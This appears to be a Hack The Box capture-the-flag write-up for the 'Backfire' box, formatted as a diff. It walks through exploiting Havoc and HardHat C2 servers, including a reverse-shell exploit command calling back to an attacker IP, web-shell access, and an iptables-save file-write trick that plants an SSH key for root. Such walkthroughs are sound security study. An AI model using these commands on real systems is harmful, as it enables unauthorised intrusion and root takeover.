@@ -1,0 +1,130 @@
+Title: Backfire
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Backfire was a Linux box themed around red-team C2 frameworks (Havoc and HardHat C2). An open directory listing leaks C2 configuration files containing plaintext credentials, and a patch file in that listing points at a known Havoc C2 RCE that grants an initial shell. From there, two internally-bound C2 team servers are reachable via SSH tunneling; one of them (HardHat C2) is vulnerable to a public auth-bypass/RCE chain that yields a web shell as a second user. That user has passwordless sudo on `iptables`/`iptables-save`, which - thanks to iptables' free-form rule comments - can be abused as an arbitrary file-write primitive to plant an SSH key in root's `authorized_keys`.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.49
+PORT     STATE SERVICE
+22/tcp   open  ssh
+443/tcp  open  https
+8000/tcp open  http-alt
+
+> nmap -sC -sV -p22,443,8000 10.10.11.49
+22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
+443/tcp  open  ssl/http nginx 1.22.1
+8000/tcp open  http     nginx 1.22.1
+|_http-title: Index of /
+| http-ls: Volume /
+| SIZE  TIME               FILENAME
+| 1559  17-Dec-2024 12:31  disable_tls.patch
+| 875   17-Dec-2024 12:34  havoc.yaotl
+```
+
+Port 8000 exposes an open directory listing with two downloadable files, `disable_tls.patch` and `havoc.yaotl`.
+
+## Foothold - Havoc C2 RCE
+
+Pulling down both files from the port 8000 listing paid off immediately - they contained plaintext credentials for two local accounts:
+
+```
+ilya:CobaltStr1keSuckz!
+sergej:1w4nt2sw1tch2h4rdh4tc2
+```
+
+Direct SSH login with either account was rejected (`Permission denied (publickey)` - password auth is disabled). `disable_tls.patch` showed the box's Havoc C2 instance had been patched to use `ws` instead of `wss` and to ignore SSL errors, pointing at a vulnerable Havoc deployment. Searching for Havoc CVEs surfaced CVE-2024-41570, an RCE affecting Havoc C2, with a public exploit at https://github.com/kit4py/CVE-2024-41570.
+
+```
+> python ./CVE-2024-41570/exploit.py -t https://10.10.11.49 -i 127.0.0.1 -p 40056 -U ilya -P 'CobaltStr1keSuckz!' -l 10.10.14.179 -L 443
+```
+
+Running the exploit with `ilya`'s leaked credentials returned a shell, which was upgraded with `python3 -c 'import pty; pty.spawn("/bin/bash")'`. The user flag was found in `/home/ilya`.
+
+## Stabilizing Access
+
+The shell from the exploit was unstable and kept dropping, requiring the exploit to be re-run repeatedly. Checking `~/.ssh/authorized_keys` for `ilya` showed a pre-existing public key already present on the account. To get a reliable, persistent session, an attacker-controlled SSH key was appended to that same `authorized_keys` file, after which `ssh -i ~/.ssh/id_ed25519 ilya@10.10.11.49` gave a stable connection.
+
+## Internal Service Discovery
+
+linpeas didn't surface anything beyond a list of listening ports. `ilya`'s home directory also contained a note, `hardhat.txt`, mentioning that `sergej` had installed HardHat C2 for testing with default settings left unchanged:
+
+```
+tcp   127.0.0.1:8443    LISTEN
+tcp   0.0.0.0:8000      LISTEN
+tcp   0.0.0.0:443       LISTEN
+tcp   127.0.0.1:40056   LISTEN
+tcp   0.0.0.0:22        LISTEN
+tcp   0.0.0.0:5000      LISTEN
+tcp   0.0.0.0:7096      LISTEN
+```
+
+Tunneling the interesting ports back over SSH and re-scanning them locally identified two Kestrel (ASP.NET) services tied to HardHat C2:
+
+```
+> ssh -i ~/.ssh/id_ed25519 -N -L 5000:localhost:5000 -L 8443:localhost:8443 -L 8000:localhost:8000 -L 7096:localhost:7096 ilya@10.10.11.49
+> nmap -sC -sV -p5000,8443,8000,7096 localhost
+5000/tcp open  ssl/http Microsoft Kestrel httpd
+| ssl-cert: Subject: commonName=HardHat TeamServer
+7096/tcp open  ssl/http Microsoft Kestrel httpd
+| ssl-cert: Subject: commonName=HardHat Client
+8000/tcp open  http     nginx 1.22.1
+|_http-title: Index of /
+8443/tcp open  ssl/http nginx
+|_http-title: 404 Not Found
+```
+
+Port 5000 is the HardHat C2 team server and 7096 is its client/web interface.
+
+## HardHat C2 Auth Bypass and RCE
+
+Searching for HardHat C2 vulnerabilities surfaced a write-up describing an authentication bypass and RCE chain: https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7. The accompanying exploit script was pointed at the forwarded local ports:
+
+```
+> python test.py
+```
+
+The script's user-creation step failed, but reading through it revealed a hardcoded default username and password of `sth_pentest` for both fields. Logging in directly at `https://localhost:7096/` with those credentials succeeded. Following the rest of the write-up to reach a web shell confirmed execution as `sergej`:
+
+```
+web> whoami
+sergej
+```
+
+The web shell was used to append an attacker-controlled SSH key to `sergej`'s `authorized_keys`, after which a normal SSH session was opened:
+
+```
+> ssh -i ~/.ssh/id_ed25519 sergej@10.10.11.49
+```
+
+## Privilege Escalation - sudo iptables-save Arbitrary File Write
+
+```
+sergej> sudo -l
+User sergej may run the following commands on backfire:
+    (root) NOPASSWD: /usr/sbin/iptables
+    (root) NOPASSWD: /usr/sbin/iptables-save
+```
+
+Passwordless sudo on `iptables` and `iptables-save` is a known privilege-escalation primitive (see https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/): iptables rules accept a free-form `--comment` string, and `iptables-save -f <path>` dumps the full ruleset - comments included - to an arbitrary file as root. That turns the pair of allowed commands into an arbitrary-file-write primitive controlled entirely by the rule comment text.
+
+An initial proof of concept targeted `/etc/passwd`, generating a root password hash with `openssl passwd` and writing it in as a comment so that dumping the ruleset over `/etc/passwd` would append a rewritten root entry with a known password. Writing over `/etc/passwd` didn't lead anywhere useful here, since the box has SSH password authentication disabled - so a password-based root account is not enough to log in remotely. The technique was pivoted to target root's `authorized_keys` instead:
+
+```
+sergej> sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINSBlohDw/HxjsPdjhUVS2fDJALFRN8rkSmkjXx1gHkZ daumega@gmail.com\n' && sudo iptables-save -f /root/.ssh/authorized_keys
+> ssh -i ~/.ssh/id_ed25519 root@10.10.11.49
+```
+
+This planted an attacker-controlled SSH key directly into root's `authorized_keys`, and SSH login as root succeeded.
+
+## Takeaways
+
+- Open directory listings are worth pulling in full - config/patch files meant for internal use can leak plaintext credentials and reveal exactly which service and version is running.
+- Self-hosted red-team C2 frameworks (Havoc, HardHat C2, etc.) are regular software with their own CVEs; treat them as attackable services, not just as tools the box owner happens to be running.
+- A shell obtained through an unreliable exploit is worth stabilizing immediately (own SSH key in `authorized_keys`, or an equivalent persistence step) rather than repeatedly re-triggering the same exploit.
+- When a public exploit's automated step (like user creation) fails, it's worth reading the script for hardcoded defaults - they may already grant access on their own.
+- Passwordless sudo on `iptables`/`iptables-save` is equivalent to an arbitrary-file-write-as-root primitive, since rule comments are attacker-controlled text that gets dumped verbatim into whatever file `iptables-save -f` targets.
